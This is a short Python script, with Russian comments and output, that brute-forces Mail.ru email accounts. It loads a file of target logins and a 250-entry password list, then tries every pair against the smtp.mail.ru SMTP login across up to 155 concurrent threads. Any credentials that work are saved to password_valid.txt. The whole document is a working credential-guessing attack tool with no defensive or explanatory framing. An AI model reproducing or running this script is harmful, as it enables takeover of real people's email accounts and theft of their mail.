import smtplib
import threading
import time

f = open('MailruLogin.txt')
email = f.readlines()
print ("Всего email:", len(email))
f.close()

f = open ('pass250.txt')
word = f.readlines()
print ("Всего паролей :", len(word))
f.close()




def brut(login, password, x, y = False):	
	login = login.strip(' \n\t')
	password = password.strip(' \n\t')	
		
	smtpObj = smtplib.SMTP('smtp.mail.ru')
	smtpObj.starttls()
	
	try :
		smtpObj.login(login, password)
	except:
		#if _FIND != 'ON': return 0
		print ("#", x ,"\tЦель ->", login, "#", y, "\tНЕ верный пароль :",  login, "->", password)
		smtpObj.quit()		
		return 
	#Если пароль верный
	print ("#", y, "\t!!! Верный пароль: ", password,"для :", login)
	f=open ('password_valid.txt','a')
	f.write(login +" -> " +  password + "\n")
	f.close	
	smtpObj.quit()		

#Тело скрипта
	
for x in range(0,len(email)):
	y=0
	while y in range(0,len(word)):		

		if threading.active_count() < 155: # количество потоков			
			threading.Thread(target = brut , args = ( email[x], word[y], x, y )).start()
			y = y + 1
			time.sleep(0.01)
		else:
			time.sleep(0.1)


'''
#smtpObj.sendmail('Razor@mail.ru',"razor@mail.ru","go to bed!")

'''
